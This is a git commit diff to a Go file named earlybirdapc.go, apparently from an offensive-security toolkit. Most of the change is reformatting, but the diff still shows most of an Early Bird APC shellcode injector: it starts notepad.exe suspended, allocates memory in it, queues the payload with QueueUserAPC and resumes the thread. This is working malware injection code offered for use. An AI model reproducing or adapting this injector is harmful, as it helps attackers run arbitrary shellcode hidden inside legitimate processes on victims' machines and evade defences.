020b03beba76439a4d8146e3d4906cc3187765dd
D3Ext <67125397+D3Ext@users.noreply.github.com>
2023-01-15 22:03:49 +0100

    Update earlybirdapc.go

--- shellcode/earlybirdapc.go
+++ shellcode/earlybirdapc.go
@@ -9,27 +9,23 @@ import (
 )
 
 func EarlyBirdApc(shellcode []byte) (error){
-  kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-  VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
-  VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
-  WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
-  QueueUserAPC := kernel32.NewProc("QueueUserAPC")
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
+	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
+	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
+	QueueUserAPC := kernel32.NewProc("QueueUserAPC")
 
-  procInfo := &windows.ProcessInformation{}
-  startupInfo := &windows.StartupInfo{
-    Flags: windows.CREATE_SUSPENDED,
-  }
-
-  errCreateProcess := windows.CreateProcess(syscall.StringToUTF16Ptr("C:\\Windows\\System32\\notepad.exe"), syscall.StringToUTF16Ptr(""), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
-  if errCreateProcess != nil {
-    return errors.New(fmt.Sprintf("[!] Error calling CreateProcess: %v", errCreateProcess.Error()))
-  }
-
-  addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
-
-	if errVirtualAlloc != nil  {
-		fmt.Println("[!] Error calling VirtualAlloc:", errVirtualAlloc.Error())
+	procInfo := &windows.ProcessInformation{}
+	startupInfo := &windows.StartupInfo{
+		Flags: windows.CREATE_SUSPENDED,
 	}
+
+	errCreateProcess := windows.CreateProcess(syscall.StringToUTF16Ptr("C:\\Windows\\System32\\notepad.exe"), syscall.StringToUTF16Ptr(""), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
+	if errCreateProcess != nil {
+		return errors.New(fmt.Sprintf("[!] Error calling CreateProcess: %v", errCreateProcess.Error()))
+	}
+
+	addr, _, _ := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 
 	if addr == 0 {
 		return errors.New("[!] VirtualAllocEx failed and returned 0")
@@ -49,27 +45,25 @@ func EarlyBirdApc(shellcode []byte) (error){
 
 	_, _, err := QueueUserAPC.Call(addr, uintptr(procInfo.Thread), 0)
 	if err != nil {
-    fmt.Println("[!] Error calling QueueUserAPC:", err.Error())
+		fmt.Println("[!] Error calling QueueUserAPC:", err.Error())
 	}
 
 	_, errResumeThread := windows.ResumeThread(procInfo.Thread)
 	if errResumeThread != nil {
-    fmt.Println(errResumeThread)
-    return errors.New(fmt.Sprintf("[!] Error calling ResumeThread: %v", errResumeThread.Error()))
+		return errors.New(fmt.Sprintf("[!] Error calling ResumeThread: %v", errResumeThread.Error()))
 	}
 
 	errCloseProcHandle := windows.CloseHandle(procInfo.Process)
 	if errCloseProcHandle != nil {
-    fmt.Println(errCloseProcHandle)
-    return errCloseProcHandle
+		return errCloseProcHandle
 	}
 
 	errCloseThreadHandle := windows.CloseHandle(procInfo.Thread)
 	if errCloseThreadHandle != nil {
-    return errCloseThreadHandle
-  }
+		return errCloseThreadHandle
+	}
 
-  return nil
+	return nil
 }
 
 
